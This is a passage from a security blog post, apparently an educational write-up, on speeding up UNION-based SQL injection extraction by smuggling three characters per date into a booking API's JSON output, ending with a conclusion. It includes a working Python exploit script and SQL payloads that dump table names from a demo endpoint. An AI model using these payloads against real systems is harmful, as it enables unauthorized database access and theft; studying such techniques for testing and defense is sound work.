  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/availability.php?id=12345%20union%20select%201%20,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_time<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,4%20</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fr<span class="token punctuation">&#125;</span></span><span class="token string">&amp;start_time=2023-01-01&amp;end_time=2023-01-01'</span></span><span class="token punctuation">)</span>
  index <span class="token operator">+=</span> <span class="token number">3</span>
  <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    d <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'events'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'end'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
    <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token string">'2023-01-01'</span><span class="token punctuation">:</span>
      <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      diff <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> base_time
      diff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>diff<span class="token operator">/</span><span class="token number">86400</span><span class="token punctuation">)</span>
      is_over <span class="token operator">=</span> <span class="token boolean">False</span>
      <span class="token keyword">while</span> diff <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> diff <span class="token operator">%</span> <span class="token number">128</span>
        <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
          is_over <span class="token operator">=</span> <span class="token boolean">True</span>
          <span class="token keyword">break</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
        diff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">-</span> num<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">128</span><span class="token punctuation">)</span>

      <span class="token keyword">if</span> is_over<span class="token punctuation">:</span>
        <span class="token keyword">break</span>

      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"current:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>
      
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result of running it is:</p>
<p><img src="/img/sql-injection-in-action/p7.png"></p>
<p>It took about 13 seconds, which is a bit faster.</p>
<h3><span id="final-acceleration-making-use-of-multiple-dates">Final acceleration: Making use of multiple dates</span></h3><p>In the previous examples, we only passed in one day as the date range, so the response only contained data for one day. However, this feature can actually accept a date range. For example, if we pass in <code>2023-01-01 ~ 2023-01-05</code>, we will get the response for five days:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
    <span class="token string-property property">"events"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token string">"2021-01-01"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token string">"2021-01-01"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token string">"Unavailable"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token string">"2021-01-02"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token string">"2021-01-02"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token string">"Unavailable"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token string">"2021-01-03"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token string">"2021-01-03"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token string">"Unavailable"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token string">"2021-01-04"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token string">"2021-01-04"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token string">"Unavailable"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token string">"2021-01-05"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token string">"2021-01-05"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token string">"Unavailable"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In order to simplify the query, we only used one date in the previous query, and we know that a date can return 3 characters of information. If we design the query carefully and make sure that the return value of each day carries 3 characters, we can return 30 characters at once if we use it for 10 days. The query will look like this:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1672502400</span><span class="token punctuation">,</span>
      ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span>
      <span class="token operator">+</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span><span class="token operator">*</span><span class="token number">128</span>
      <span class="token operator">+</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">*</span><span class="token number">128</span>
      <span class="token operator">+</span> <span class="token number">1672502400</span>
    <span class="token punctuation">,</span><span class="token number">1</span>  <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1672588800</span><span class="token punctuation">,</span>
      ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span>
      <span class="token operator">+</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span><span class="token operator">*</span><span class="token number">128</span>
      <span class="token operator">+</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">*</span><span class="token number">128</span>
      <span class="token operator">+</span> <span class="token number">1672588800</span>
    <span class="token punctuation">,</span><span class="token number">1</span>  <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1672675200</span><span class="token punctuation">,</span>
      ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span>
      <span class="token operator">+</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span><span class="token operator">*</span><span class="token number">128</span>
      <span class="token operator">+</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">86400</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">*</span><span class="token number">128</span>
      <span class="token operator">+</span> <span class="token number">1672675200</span>
    <span class="token punctuation">,</span><span class="token number">1</span>  <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The script is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-ava-30x.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">to_ts</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>raw<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
base_time <span class="token operator">=</span> <span class="token number">1672502400</span>
index <span class="token operator">=</span> <span class="token number">1</span>
result <span class="token operator">=</span> <span class="token string">''</span>
field <span class="token operator">=</span> <span class="token string">'group_concat(table_name)'</span>
fr <span class="token operator">=</span> <span class="token string">" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"</span>
start_time <span class="token operator">=</span> <span class="token string">'2023-01-01'</span>
end_time <span class="token operator">=</span> <span class="token string">'2023-01-10'</span>
date_count <span class="token operator">=</span> <span class="token number">10</span>
fetch_per_union <span class="token operator">=</span> <span class="token number">3</span>

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  unions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  query_time <span class="token operator">=</span> base_time
  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>date_count<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
      ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">))*86400
      + ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">))*86400*128
      + ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">))*86400*128*128
      + </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_time<span class="token punctuation">&#125;</span></span><span class="token string">
    '''</span></span>

    unions<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'union select 1,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_time<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">,1 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>fr<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    index <span class="token operator">+=</span> fetch_per_union
    query_time <span class="token operator">+=</span> <span class="token number">86400</span>

  payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>unions<span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/availability.php?id=12345%20</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">&amp;start_time=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start_time<span class="token punctuation">&#125;</span></span><span class="token string">&amp;end_time=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>end_time<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token keyword">not</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
  is_finished <span class="token operator">=</span> <span class="token boolean">False</span>
  <span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'events'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    diff <span class="token operator">=</span> to_ts<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'end'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> to_ts<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    diff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>diff<span class="token operator">/</span><span class="token number">86400</span><span class="token punctuation">)</span>
    is_finished <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">if</span> diff <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      is_finished <span class="token operator">=</span> <span class="token boolean">True</span>
      <span class="token keyword">break</span>

    count <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> diff <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
      num <span class="token operator">=</span> diff <span class="token operator">%</span> <span class="token number">128</span>
      <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        is_finished <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">break</span>
      count<span class="token operator">+=</span><span class="token number">1</span>
      result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
      diff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">-</span> num<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">128</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> count <span class="token operator">!=</span> fetch_per_union<span class="token punctuation">:</span>
      is_finished <span class="token operator">=</span> <span class="token boolean">True</span>
      <span class="token keyword">break</span>

    <span class="token keyword">if</span> is_finished<span class="token punctuation">:</span>
      <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"current:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>

  <span class="token keyword">if</span> is_finished<span class="token punctuation">:</span>
    <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The execution result will look like this, and you can see that each data’s end carries 3 characters of information:</p>
<p><img src="/img/sql-injection-in-action/p8.png"></p>
<p>This time, only one query was used, and it took a total of 4 seconds to get 30 characters. Most of the time was actually spent on SQL processing the query.</p>
<h2><span id="conclusion">Conclusion</span></h2><p>All sample code is here: <a target="_blank" rel="noopener" href="https://github.com/aszx87410/demo/tree/master/sql-injection">https://github.com/aszx87410/demo/tree/master/sql-injection</a></p>
<p>Although most situations can be handled with multiple threads, it is necessary to consider that some servers may have rate limiting and cannot send so many requests. Leaving aside the issue of bypassing rate limiting, I think it is quite interesting to maximize the amount of information returned by a query and reduce the number of requests. Therefore, this article and various methods were created.</p>
<p>In the first case, binary search was used to reduce the number of requests, and in the second case, the data was smuggled into the date by converting the string into a number, and more characters were smuggled using multiple dates.</p>
<p>In addition, the <code>ASCII</code> function used in the implementation above has some limitations. For example, it will explode if it is Chinese. At this time, you can use <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_ord">ORD</a> or <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_hex">HEX</a> and other functions, which will have better support.</p>
<p>I think it is not difficult to come up with these solutions, but the most troublesome part is the implementation. Originally, I didn’t want to do it. I just wanted to write a sentence in the article: “In theory, doing this can be faster, and the implementation is left to everyone.” But after thinking about it, I still think I should do it.</p>
<p>If you just want to prove that the SQL injection vulnerability exists, the slowest method is enough, but I am still curious: “If you really want to dump the entire database, how can you do it faster?” Maybe I should find some time to study sqlmap, which should provide a lot of inspiration.</p>
<p>Reference:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/">Comma is forbidden! No worries!! Inject in insert&#x2F;update queries without it</a></li>
</ol>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/01/30/en/how-to-validate-javascript-knowledge/">Your JavaScript Knowledge Might Be Wrong</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/01/16/en/same-site-to-same-origin-document-domain/">The Art of Turning Same Site into Same Origin!</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/01/19/sql-injection-in-action/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>